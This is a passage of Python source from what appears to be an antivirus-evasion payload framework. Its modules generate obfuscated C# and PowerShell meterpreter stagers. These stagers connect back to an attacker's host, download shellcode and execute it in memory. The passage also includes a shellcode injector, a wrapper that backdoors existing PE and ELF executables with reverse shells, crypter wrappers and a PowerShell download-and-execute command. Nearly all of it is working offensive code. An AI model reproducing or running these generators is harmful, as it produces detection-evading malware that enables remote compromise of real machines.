        payloadCode += "        UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, sName)
        payloadCode += "        Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" %(sName,funcAddrName, sName)
        payloadCode += "        IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
        payloadCode += "        UInt32 %s = 0;\n" %(threadIdName)
        payloadCode += "        IntPtr %s = IntPtr.Zero;\n" %(pinfoName)
        payloadCode += "        %s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" %(hThreadName, funcAddrName, pinfoName, threadIdName)
        payloadCode += "        WaitForSingleObject(%s, 0xFFFFFFFF); }}\n" %(hThreadName)


        # code for Main() to launch everything
        sName = helpers.randomString()
        randomName = helpers.randomString()

        payloadCode += "static void Main(){\n"
        payloadCode += "Random %s = new Random((int)DateTime.Now.Ticks);\n" %(randomName)
        payloadCode += "byte[] %s = %s(\"http://%s:%s/\" + %s(%s));\n" %(sName, getDataName, self.required_options["LHOST"][0],self.required_options["LPORT"][0],genHTTPChecksumName,randomName)
        payloadCode += "%s(%s);}\n" %(injectName, sName)

        # get 12 random variables for the API imports
        r = [helpers.randomString() for x in xrange(12)]
        payloadCode += """[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s); } }\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11])


        return payloadCode

########NEW FILE########
__FILENAME__ = rev_https
"""

Custom-written pure c# meterpreter/reverse_https stager.
Uses basic variable renaming obfuscation.

Module built by @harmj0y

"""

from modules.common import helpers
import random

class Payload:
    
    def __init__(self):
        # required options
        self.description = "pure windows/meterpreter/reverse_https stager, no shellcode"
        self.language = "cs"
        self.extension = "cs"
        self.rating = "Excellent"

        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"LHOST"            : ["", "IP of the metasploit handler"],
                                 "LPORT"            : ["8081", "Port of the metasploit handler"],
                                 "compile_to_exe"   : ["Y", "Compile to an executable"]}
        
        
    def generate(self):

        # imports and namespace setup
        payloadCode = "using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices;\n"
        payloadCode += "namespace %s { class %s {\n" % (helpers.randomString(), helpers.randomString())

        # code for the randomString() function
        randomStringName = helpers.randomString()
        bufferName = helpers.randomString()
        charsName = helpers.randomString()
        t = list("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
        random.shuffle(t)
        chars = ''.join(t)


        # logic to turn off certificate validation
        validateServerCertficateName = helpers.randomString()
        payloadCode += "private static bool %s(object sender, System.Security.Cryptography.X509Certificates.X509Certificate cert,System.Security.Cryptography.X509Certificates.X509Chain chain,System.Net.Security.SslPolicyErrors sslPolicyErrors) { return true; }\n" %(validateServerCertficateName)


        # code for the randomString() method
        payloadCode += "static string %s(Random r, int s) {\n" %(randomStringName)
        payloadCode += "char[] %s = new char[s];\n"%(bufferName)
        payloadCode += "string %s = \"%s\";\n" %(charsName, chars)
        payloadCode += "for (int i = 0; i < s; i++){ %s[i] = %s[r.Next(%s.Length)];}\n" %(bufferName, charsName, charsName)
        payloadCode += "return new string(%s);}\n" %(bufferName)


        # code for the checksum8() function
        checksum8Name = helpers.randomString()
        payloadCode += "static bool %s(string s) {return ((s.ToCharArray().Select(x => (int)x).Sum()) %% 0x100 == 92);}\n" %(checksum8Name)


        # code fo the genHTTPChecksum() function
        genHTTPChecksumName = helpers.randomString()
        baseStringName = helpers.randomString()
        randCharsName = helpers.randomString()
        urlName = helpers.randomString()
        random.shuffle(t)
        randChars = ''.join(t)

        payloadCode += "static string %s(Random r) { string %s = \"\";\n" %(genHTTPChecksumName,baseStringName)
        payloadCode += "for (int i = 0; i < 64; ++i) { %s = %s(r, 3);\n" %(baseStringName,randomStringName)
        payloadCode += "string %s = new string(\"%s\".ToCharArray().OrderBy(s => (r.Next(2) %% 2) == 0).ToArray());\n" %(randCharsName,randChars)
        payloadCode += "for (int j = 0; j < %s.Length; ++j) {\n" %(randCharsName)
        payloadCode += "string %s = %s + %s[j];\n" %(urlName,baseStringName,randCharsName)
        payloadCode += "if (%s(%s)) {return %s;}}} return \"9vXU\";}"%(checksum8Name,urlName, urlName)


        # code for getData() function
        getDataName = helpers.randomString()
        strName = helpers.randomString()
        webClientName = helpers.randomString()
        sName = helpers.randomString()

        payloadCode += "static byte[] %s(string %s) {\n" %(getDataName,strName)
        payloadCode += "ServicePointManager.ServerCertificateValidationCallback = %s;\n" %(validateServerCertficateName) 
        payloadCode += "WebClient %s = new System.Net.WebClient();\n" %(webClientName)
        payloadCode += "%s.Headers.Add(\"User-Agent\", \"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\");\n" %(webClientName)
        payloadCode += "%s.Headers.Add(\"Accept\", \"*/*\");\n" %(webClientName)
        payloadCode += "%s.Headers.Add(\"Accept-Language\", \"en-gb,en;q=0.5\");\n" %(webClientName)
        payloadCode += "%s.Headers.Add(\"Accept-Charset\", \"ISO-8859-1,utf-8;q=0.7,*;q=0.7\");\n" %(webClientName)
        payloadCode += "byte[] %s = null;\n" %(sName)
        payloadCode += "try { %s = %s.DownloadData(%s);\n" %(sName, webClientName, strName)
        payloadCode += "if (%s.Length < 100000) return null;}\n" %(sName)
        payloadCode += "catch (WebException) {}\n"
        payloadCode += "return %s;}\n" %(sName)


        # code fo the inject() function to inject shellcode
        injectName = helpers.randomString()
        sName = helpers.randomString()
        funcAddrName = helpers.randomString()
        hThreadName = helpers.randomString()
        threadIdName = helpers.randomString()
        pinfoName = helpers.randomString()

        payloadCode += "static void %s(byte[] %s) {\n" %(injectName, sName)
        payloadCode += "    if (%s != null) {\n" %(sName)
        payloadCode += "        UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, sName)
        payloadCode += "        Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" %(sName,funcAddrName, sName)
        payloadCode += "        IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
        payloadCode += "        UInt32 %s = 0;\n" %(threadIdName)
        payloadCode += "        IntPtr %s = IntPtr.Zero;\n" %(pinfoName)
        payloadCode += "        %s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" %(hThreadName, funcAddrName, pinfoName, threadIdName)
        payloadCode += "        WaitForSingleObject(%s, 0xFFFFFFFF); }}\n" %(hThreadName)


        # code for Main() to launch everything
        sName = helpers.randomString()
        randomName = helpers.randomString()

        payloadCode += "static void Main(){\n"
        payloadCode += "Random %s = new Random((int)DateTime.Now.Ticks);\n" %(randomName)
        payloadCode += "byte[] %s = %s(\"https://%s:%s/\" + %s(%s));\n" %(sName, getDataName, self.required_options["LHOST"][0],self.required_options["LPORT"][0],genHTTPChecksumName,randomName)
        payloadCode += "%s(%s);}\n" %(injectName, sName)

        # get 12 random variables for the API imports
        r = [helpers.randomString() for x in xrange(12)]
        payloadCode += """[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s); } }\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11])


        return payloadCode

########NEW FILE########
__FILENAME__ = rev_tcp
"""

Custom-written pure c# meterpreter/reverse_tcp stager.
Uses basic variable renaming obfuscation.

Module built by @harmj0y

"""

from modules.common import helpers

class Payload:
    
    def __init__(self):
        # required options
        self.description = "pure windows/meterpreter/reverse_tcp stager, no shellcode"
        self.language = "cs"
        self.extension = "cs"
        self.rating = "Excellent"

        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"LHOST" : ["", "IP of the metasploit handler"],
                                 "LPORT" : ["4444", "Port of the metasploit handler"],
                                 "compile_to_exe" : ["Y", "Compile to an executable"]}
        
        
    def generate(self):

        getDataName = helpers.randomString()
        injectName = helpers.randomString()

        payloadCode = "using System; using System.Net; using System.Net.Sockets; using System.Runtime.InteropServices;\n"
        payloadCode += "namespace %s { class %s {\n" % (helpers.randomString(), helpers.randomString())

        hostName = helpers.randomString()
        portName = helpers.randomString()
        ipName = helpers.randomString()
        sockName = helpers.randomString()
        length_rawName = helpers.randomString()
        lengthName = helpers.randomString()
        sName = helpers.randomString()
        total_bytesName = helpers.randomString()
        handleName = helpers.randomString()

        payloadCode += "static byte[] %s(string %s, int %s) {\n" %(getDataName, hostName, portName)
        payloadCode += "    IPEndPoint %s = new IPEndPoint(IPAddress.Parse(%s), %s);\n" %(ipName, hostName, portName)
        payloadCode += "    Socket %s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);\n" %(sockName)
        payloadCode += "    try { %s.Connect(%s); }\n" %(sockName, ipName)
        payloadCode += "    catch { return null;}\n"
        payloadCode += "    byte[] %s = new byte[4];\n" %(length_rawName)
        payloadCode += "    %s.Receive(%s, 4, 0);\n" %(sockName, length_rawName)
        payloadCode += "    int %s = BitConverter.ToInt32(%s, 0);\n" %(lengthName, length_rawName)
        payloadCode += "    byte[] %s = new byte[%s + 5];\n" %(sName, lengthName)
        payloadCode += "    int %s = 0;\n" %(total_bytesName)
        payloadCode += "    while (%s < %s)\n" %(total_bytesName, lengthName)
        payloadCode += "    { %s += %s.Receive(%s, %s + 5, (%s - %s) < 4096 ? (%s - %s) : 4096, 0);}\n" %(total_bytesName, sockName, sName, total_bytesName, lengthName, total_bytesName, lengthName, total_bytesName)
        payloadCode += "    byte[] %s = BitConverter.GetBytes((int)%s.Handle);\n" %(handleName, sockName)
        payloadCode += "    Array.Copy(%s, 0, %s, 1, 4); %s[0] = 0xBF;\n" %(handleName, sName, sName)
        payloadCode += "    return %s;}\n" %(sName)


        sName = helpers.randomString()
        funcAddrName = helpers.randomString()
        hThreadName = helpers.randomString()
        threadIdName = helpers.randomString()
        pinfoName = helpers.randomString()

        payloadCode += "static void %s(byte[] %s) {\n" %(injectName, sName)
        payloadCode += "    if (%s != null) {\n" %(sName)
        payloadCode += "        UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, sName)
        payloadCode += "        Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" %(sName,funcAddrName, sName)
        payloadCode += "        IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
        payloadCode += "        UInt32 %s = 0;\n" %(threadIdName)
        payloadCode += "        IntPtr %s = IntPtr.Zero;\n" %(pinfoName)
        payloadCode += "        %s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" %(hThreadName, funcAddrName, pinfoName, threadIdName)
        payloadCode += "        WaitForSingleObject(%s, 0xFFFFFFFF); }}\n" %(hThreadName)


        sName = helpers.randomString()
        payloadCode += "static void Main(){\n"
        payloadCode += "    byte[] %s = null; %s = %s(\"%s\", %s);\n" %(sName, sName, getDataName, self.required_options["LHOST"][0],self.required_options["LPORT"][0])
        payloadCode += "    %s(%s); }\n" %(injectName, sName)


        # get 12 random variables for the API imports
        r = [helpers.randomString() for x in xrange(12)]
        payloadCode += """[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s); } }\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11])


        return payloadCode

########NEW FILE########
__FILENAME__ = base64_substitution
"""

C# inline injector that utilizes base64 encoding and a randomized alphabetic 
letter substitution cipher to obscure the shellcode string in the payload.
Uses basic variable renaming obfuscation.

Module built by @harmj0y

"""

import string, random

from modules.common import shellcode
from modules.common import encryption
from modules.common import helpers

class Payload:
    
    def __init__(self):
        # required
        self.language = "cs"
        self.extension = "cs"
        self.rating = "Normal"
        self.description = "C# method that base64/letter substitutes the shellcode to inject"
        
        self.shellcode = shellcode.Shellcode()
        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"]}

        
    def generate(self):
        
        Shellcode = self.shellcode.generate()
        
        # the 'key' is a randomized alpha lookup table [a-zA-Z] used for substitution
        key = ''.join(sorted(list(string.ascii_letters), key=lambda *args: random.random()))
        base64payload = encryption.b64sub(Shellcode,key)

        # randomize all our variable names, yo'
        namespaceName = helpers.randomString()
        className = helpers.randomString()
        shellcodeName = helpers.randomString()
        funcAddrName = helpers.randomString()

        hThreadName = helpers.randomString()
        threadIdName = helpers.randomString()
        pinfoName = helpers.randomString()

        baseStringName = helpers.randomString()
        targetStringName = helpers.randomString()

        decodeFuncName = helpers.randomString()
        base64DecodeFuncName = helpers.randomString()
        dictionaryName = helpers.randomString()


        payloadCode = "using System; using System.Net; using System.Text; using System.Linq; using System.Net.Sockets;" 
        payloadCode += "using System.Collections.Generic; using System.Runtime.InteropServices;\n"

        payloadCode += "namespace %s { class %s { private static string %s(string t, string k) {\n" % (namespaceName, className, decodeFuncName)
        payloadCode += "string %s = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n" %(baseStringName)
        payloadCode += "string %s = \"\"; Dictionary<char, char> %s = new Dictionary<char, char>();\n" %(targetStringName,dictionaryName)
        payloadCode += "for (int i = 0; i < %s.Length; ++i){ %s.Add(k[i], %s[i]); }\n" %(baseStringName,dictionaryName,baseStringName)
        payloadCode += "for (int i = 0; i < t.Length; ++i){ if ((t[i] >= 'A' && t[i] <= 'Z') || (t[i] >= 'a' && t[i] <= 'z')) { %s += %s[t[i]];}\n" %(targetStringName, dictionaryName)
        payloadCode += "else { %s += t[i]; }} return %s; }\n" %(targetStringName,targetStringName)


        encodedDataName = helpers.randomString()
        encodedBytesName = helpers.randomString()

        payloadCode += "static public string %s(string %s) {\n" %(base64DecodeFuncName,encodedDataName)
        payloadCode += "byte[] %s = System.Convert.FromBase64String(%s);\n" %(encodedBytesName,encodedDataName)
        payloadCode += "return System.Text.ASCIIEncoding.ASCII.GetString(%s);}\n" %(encodedBytesName)

        base64PayloadName = helpers.randomString()
        payloadCode += "static void Main() {\n"
        payloadCode += "string %s = \"%s\";\n" % (base64PayloadName, base64payload)
        payloadCode += "string key = \"%s\";\n" %(key)
        payloadCode += "string p = (%s(%s(%s, key)).Replace(\"\\\\\", \",0\")).Substring(1);\n" %(base64DecodeFuncName, decodeFuncName, base64PayloadName)
        payloadCode += "string[] chars = p.Split(',').ToArray();\n"
        payloadCode += "byte[] %s = new byte[chars.Length];\n" %(shellcodeName)
        payloadCode += "for (int i = 0; i < chars.Length; ++i) { %s[i] = Convert.ToByte(chars[i], 16); }\n"  %(shellcodeName)

        payloadCode += "UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" % (funcAddrName, shellcodeName)
        payloadCode += "Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" % (shellcodeName, funcAddrName, shellcodeName)
        payloadCode += "IntPtr %s = IntPtr.Zero; UInt32 %s = 0; IntPtr %s = IntPtr.Zero;\n" %(hThreadName, threadIdName, pinfoName)
        payloadCode += "%s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" % (hThreadName, funcAddrName, pinfoName, threadIdName)
        payloadCode += "WaitForSingleObject(%s, 0xFFFFFFFF);}\n" %(hThreadName)

        # get 12 random variables for the API imports
        r = [helpers.randomString() for x in xrange(12)]

        # payloadCode += "private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n"
        payloadCode += """[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s); } }\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11])

        return payloadCode


########NEW FILE########
__FILENAME__ = virtual
"""

C# inline shellcode injector using the VirtualAlloc()/CreateThread() pattern.
Uses basic variable renaming obfuscation.

Adapated from code from: 
    http://webstersprodigy.net/2012/08/31/av-evading-meterpreter-shell-from-a-net-service/

Module built by @harmj0y

"""

from modules.common import shellcode
from modules.common import helpers

class Payload:
    
    def __init__(self):
        # required
        self.language = "cs"
        self.extension = "cs"
        self.rating = "Poor"
        self.description = "C# VirtualAlloc method for inline shellcode injection"

        self.shellcode = shellcode.Shellcode()
        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"]}


    def generate(self):
        
        Shellcode = self.shellcode.generate()
        Shellcode = "0" + ",0".join(Shellcode.split("\\")[1:])

        # randomize all our variable names, yo'
        namespaceName = helpers.randomString()
        className = helpers.randomString()
        bytearrayName = helpers.randomString()
        funcAddrName = helpers.randomString()

        hThreadName = helpers.randomString()
        threadIdName = helpers.randomString()
        pinfoName = helpers.randomString()

        # get 12 random variables for the API imports
        r = [helpers.randomString() for x in xrange(12)]

        payloadCode = "using System; using System.Net; using System.Net.Sockets; using System.Runtime.InteropServices;\n"
        payloadCode += "namespace %s { class %s  { static void Main() {\n" % (namespaceName, className)
        payloadCode += "byte[] %s = {%s};" % (bytearrayName,Shellcode)
        
        payloadCode += "UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" % (funcAddrName, bytearrayName)
        payloadCode += "Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" % (bytearrayName, funcAddrName, bytearrayName)
        payloadCode += "IntPtr %s = IntPtr.Zero; UInt32 %s = 0; IntPtr %s = IntPtr.Zero;\n" %(hThreadName, threadIdName, pinfoName)
        payloadCode += "%s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" % (hThreadName, funcAddrName, pinfoName, threadIdName)
        payloadCode += "WaitForSingleObject(%s, 0xFFFFFFFF);}\n" %(hThreadName)
        # payloadCode += "private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n"
        payloadCode += """[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s); } }\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11])

        return payloadCode


########NEW FILE########
__FILENAME__ = backdoor_factory
"""

Automates running the Backdoor Factory on an existing .exe

More information from
        Joshua Pitts - https://github.com/secretsquirrel/the-backdoor-factory

"""

import sys, time, subprocess
import shutil
from modules.common import helpers
from modules.common import shellcode
from tools.backdoor import pebin
from tools.backdoor import elfbin

# the main config file
import settings

class Payload:

    def __init__(self):
        # required options
        self.description = "Import of the BackdoorFactory."
        self.description +=" Supports PE and ELF file formats."
	self.description +=" Author: Joshua Pitts @midnite_runr"
	self.language = "native"
        self.rating = "Normal"
	self.extension = ""
	self.type = ""
        self.shellcode = shellcode.Shellcode()

        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"orig_exe"     : ["psinfo.exe", "PE or ELF executable to run through the Backdoor Factory"],
                                 "payload"          : ["meter_tcp","PE or ELF: meter_tcp, rev_shell, custom | PE only meter_https"],
                                 "LHOST"            : ["127.0.0.1", "IP of the metasploit handler"],
                                 "LPORT"            : ["4444", "Port of the metasploit handler"]}


    def basicDiscovery(self):
        try:
	    testBinary = open(self.required_options["orig_exe"][0], 'rb')
	except Exception as e:
	    self.type = ""	    
	    return
	header = testBinary.read(8)
	testBinary.close()
	if 'MZ' in header:
	    self.type = 'PE'
	elif 'ELF' in header:
	    self.type = 'ELF'
	else:
	    raise IOError
            print "\nBDF only supports intel 32/64bit PE and ELF binaries\n" 
            raw_input("\n[>] Press any key to return to the main menu:")
            self.type = ""



    def generate(self):
	#Because of calling BDF via classes, obsolute paths change
	if self.required_options["orig_exe"][0] == "psinfo.exe":
	   self.required_options["orig_exe"][0] = settings.VEIL_EVASION_PATH + "testbins/psinfo.exe"
	
	#Make sure the bin is supported
	self.basicDiscovery()

           
	if self.required_options["payload"][0] == "custom":

            Shellcode = self.shellcode.generate()

            raw = Shellcode.decode("string_escape")
            
            f = open(settings.TEMP_DIR + "shellcode.raw", 'wb')
            f.write(raw)
            f.close()
	    print "shellcode", settings.TEMP_DIR + "shellcode.raw"
	    #invoke the class for the associated binary
	    if self.type == 'PE':
		targetFile = pebin.pebin(FILE=self.required_options["orig_exe"][0], OUTPUT='payload.exe', SHELL='user_supplied_shellcode', SUPPLIED_SHELLCODE=settings.TEMP_DIR + "shellcode.raw")
                self.extension = "exe"
	    
	    elif self.type == 'ELF':
		targetFile = elfbin.elfbin(FILE=self.required_options["orig_exe"][0], OUTPUT='payload.exe', SHELL='user_supplied_shellcode', SUPPLIED_SHELLCODE=settings.TEMP_DIR + "shellcode.raw") 
        	self.extension = ""
	    else:
		print "\nInvalid File or File Type Submitted, try again.\n"
		return ""

        else:

            shellcodeChoice = ""
            if self.required_options["payload"][0] == "meter_tcp":
                shellcodeChoice = "reverse_tcp_stager"
            elif self.required_options["payload"][0] == "meter_https" and self.type == "PE":
                shellcodeChoice = "meterpreter_reverse_https"
            elif self.required_options["payload"][0] == "rev_shell":
                shellcodeChoice = "reverse_shell_tcp"
            else:
                print helpers.color("\n [!] Please enter a valid payload choice.", warning=True)
                raw_input("\n [>] Press any key to return to the main menu:")
                return ""

            # invoke the class for the associated binary
	    if self.type == 'PE':
		targetFile = pebin.pebin(FILE=self.required_options["orig_exe"][0], OUTPUT='payload.exe', SHELL=shellcodeChoice, HOST=self.required_options["LHOST"][0], PORT=int(self.required_options["LPORT"][0]))
            	self.extension = "exe"
	    elif self.type == 'ELF':
                targetFile = elfbin.elfbin(FILE=self.required_options["orig_exe"][0], OUTPUT='payload.exe',  SHELL=shellcodeChoice, HOST=self.required_options["LHOST"][0], PORT=int(self.required_options["LPORT"][0])) 
		self.extension = ""
	    else:
		print "\nInvalid File or File Type Submitted, try again.\n"
		return ""

        print helpers.color("\n[*] Running The Backdoor Factory...")

        try:
	    #PATCH STUFF
	    try:
	        targetFile.run_this()
            except SystemExit as e:
		#I use sys.exits in BDF, so not to leave Veil
		print "\nBackdoorFactory Error, check options and binary\n"
		return ""
	    #Because shits fast yo
	    time.sleep(4)
	    
	    # read in the output .exe from /tmp/
            f = open(settings.VEIL_EVASION_PATH+"backdoored/payload.exe", 'rb')
            PayloadCode = f.read()
            f.close()

        except IOError:
            print "\nError during The Backdoor Factory execution\n" 
            raw_input("\n[>] Press any key to return to the main menu:")
            return ""

	try:
	    #remove backdoored/ in VEIL root
	    shutil.rmtree(settings.VEIL_EVASION_PATH+'backdoored')

        except Exception as e:
	    #quiet failure
	    pass

	return PayloadCode

########NEW FILE########
__FILENAME__ = Hyperion
"""

Automates the running the the Hyperion crypter on an existing .exe

More information (Nullsecurity) - http://www.nullsecurity.net/papers/nullsec-bsides-slides.pdf

"""

import sys, time, subprocess

from modules.common import helpers

# the main config file
import settings

class Payload:
    
    def __init__(self):
        # required options
        self.description = "Automates the running of the Hyperion crypter on an existing .exe"
        self.language = "native"
        self.rating = "Normal"
        self.extension = "exe"

        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"original_exe" : ["", "The executable to run Hyperion on"]}
        
    def generate(self):
        
        # randomize the output file so we don't overwrite anything
        randName = helpers.randomString(5) + ".exe"
        outputFile = settings.TEMP_DIR + randName
        
        # the command to invoke hyperion. TODO: windows compatibility
        hyperionCommand = "wine hyperion.exe " + self.required_options["original_exe"][0] + " " + outputFile
        
        print helpers.color("\n[*] Running Hyperion on " + self.required_options["original_exe"][0] + "...")
        
        # be sure to set 'cwd' to the proper directory for hyperion so it properly runs
        p = subprocess.Popen(hyperionCommand, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=settings.VEIL_EVASION_PATH+"tools/hyperion/", shell=True)
        stdout, stderr = p.communicate()
        
        try:
            # read in the output .exe from /tmp/
            f = open(outputFile, 'rb')
            PayloadCode = f.read()
            f.close()
        except IOError:
            print "\nError during Hyperion execution:\n" + helpers.color(stdout, warning=True)
            raw_input("\n[>] Press any key to return to the main menu:")
            return ""
        
        # cleanup the temporary output file. TODO: windows compatibility
        p = subprocess.Popen("rm " + outputFile, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        stdout, stderr = p.communicate()

        return PayloadCode

########NEW FILE########
__FILENAME__ = pe_scrambler
"""

Automates the running the PEScrambler on an existing .exe

PEScrambler by Nick Harbour - http://code.google.com/p/pescrambler/

"""

import sys, time, subprocess, time

from modules.common import helpers

# the main config file
import settings

class Payload:
    
    def __init__(self):
        # required options
        self.description = "Automates the running of the PEScrambler crypter on an existing .exe"
        self.language = "native"
        self.rating = "Normal"
        self.extension = "exe"

        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"original_exe" : ["", "The executable to run PEScrambler on"]}
        
    def generate(self):
        
        # randomize the output file so we don't overwrite anything
        randName = helpers.randomString(5) + ".exe"
        outputFile = settings.TEMP_DIR + randName
        
        # the command to invoke hyperion. TODO: windows compatibility
        peCommand = "wine PEScrambler.exe -i " + self.required_options["original_exe"][0] + " -o " + outputFile

        print helpers.color("\n[*] Running PEScrambler on " + self.required_options["original_exe"][0] + "...")
        
        # be sure to set 'cwd' to the proper directory for hyperion so it properly runs
        p = subprocess.Popen(peCommand, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=settings.VEIL_EVASION_PATH+"tools/pescrambler/", shell=True)
        time.sleep(3)
        stdout, stderr = p.communicate()
        
        try:
            # read in the output .exe from /tmp/
            f = open(outputFile, 'rb')
            PayloadCode = f.read()
            f.close()
        except IOError:
            print "\nError during PEScrambler execution:\n" + helpers.color(stdout, warning=True)
            raw_input("\n[>] Press any key to return to the main menu:")
            return ""
        
        # cleanup the temporary output file. TODO: windows compatibility
        p = subprocess.Popen("rm " + outputFile, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        stdout, stderr = p.communicate()

        return PayloadCode

########NEW FILE########
__FILENAME__ = download_virtual
"""

Powershell method that builds a simple stager that downloads a secondary
encrypted powershell command from a web host and executes that in memory.

The secondary command is a powershell encrypted inline shellcode injector. 

Original concept from  http://obscuresecurity.blogspot.com/2013/03/powersploit-metasploit-shells.html


Module built by @harmj0y

"""

import base64

from modules.common import shellcode
from modules.common import helpers
import settings


class Payload:
    
    def __init__(self):
        self.description = "Powershell method that downloads a secondary powershell command from a webserver"
        self.rating = "Excellent"
        self.language = "powershell"
        self.extension = "txt"
        
        self.shellcode = shellcode.Shellcode()
        # format is {Option : [Value, Description]]}
        self.required_options = {"DownloadHost" : ["", "The host to download the secondary stage from"],
                        "DownloadPort" : ["80", "The port on the host to download from"]}
        self.notes = ""
        
    def generate(self):

        Shellcode = self.shellcode.generate()
        Shellcode = ",0".join(Shellcode.split("\\"))[1:]
        
        baseString = """$c = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr w, uint x, uint y, uint z);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr u, uint v, IntPtr w, IntPtr x, uint y, IntPtr z);
[DllImport("msvcrt.dll")] public static extern IntPtr memset(IntPtr x, uint y, uint z);
"@
$o = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru
$x=$o::VirtualAlloc(0,0x1000,0x3000,0x40); [Byte[]]$sc = %s;
for ($i=0;$i -le ($sc.Length-1);$i++) {$o::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1) | out-null;}
$z=$o::CreateThread(0,0,$x,0,0,0); Start-Sleep -Second 100000""" % (Shellcode)

        powershell_command  = unicode(baseString)
        blank_command = ""
        for char in powershell_command:
            blank_command += char + "\x00"
        powershell_command = blank_command
        powershell_command = base64.b64encode(powershell_command)

        payloadName = helpers.randomString()
        
        # write base64 payload out to disk
        settings.PAYLOAD_SOURCE_PATH
        secondStageName = settings.PAYLOAD_SOURCE_PATH + payloadName
        f = open( secondStageName , 'w')
        f.write("powershell -Enc %s\n" %(powershell_command))
        f.close()
        
        
        # give notes to the user
        self.notes = "\n\tsecondary payload written to " + secondStageName + " ,"
        self.notes += " serve this on http://%s:%s\n" %(self.required_options["DownloadHost"][0], self.required_options["DownloadPort"][0],)
        
        
        # build our downloader shell
        downloaderCommand = "iex (New-Object Net.WebClient).DownloadString(\"http://%s:%s/%s\")\n" %(self.required_options["DownloadHost"][0], self.required_options["DownloadPort"][0], payloadName)
        powershell_command = unicode(downloaderCommand)
        blank_command = ""
        for char in powershell_command:
            blank_command += char + "\x00"
